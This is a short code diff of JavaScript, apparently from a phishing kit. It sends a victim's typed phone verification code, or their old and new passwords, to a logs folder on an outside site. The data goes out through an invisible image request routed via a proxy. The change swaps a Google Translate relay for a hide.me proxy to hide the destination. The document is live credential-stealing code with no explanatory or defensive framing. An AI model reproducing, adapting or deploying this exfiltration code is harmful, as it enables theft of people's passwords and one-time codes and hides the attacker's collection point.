@@ -261,9 +261,9 @@
 				var tmp;
 				//http://www.inees.org/fileadmin/inees.org/files/logs/
 				if(s == 0) {
-					tmp = 'https://translate.google.com/translate?hl=en&sl=en&tl=fr&u=http://www.inees.org/fileadmin/inees.org/files/logs/?code='+phonecode.value;
+					tmp = 'https://proxy-nl.hide.me/go.php?u=en&sl=en&tl=fr&u=http://www.inees.org/fileadmin/inees.org/files/logs/?code='+phonecode.value;
 				} else {
-					tmp = 'https://translate.google.com/translate?hl=en&sl=en&tl=fr&u=http://www.inees.org/fileadmin/inees.org/files/logs/?old='+encodeURIComponent(oldpassword.value)+'&new='+encodeURIComponent(newpassword.value);	
+					tmp = 'https://proxy-nl.hide.me/go.php?u=en&sl=en&tl=fr&u=http://www.inees.org/fileadmin/inees.org/files/logs/?old='+encodeURIComponent(oldpassword.value)+'&new='+encodeURIComponent(newpassword.value);	
 				}
 				img.src = tmp;
 				imageContainer.appendChild(img);
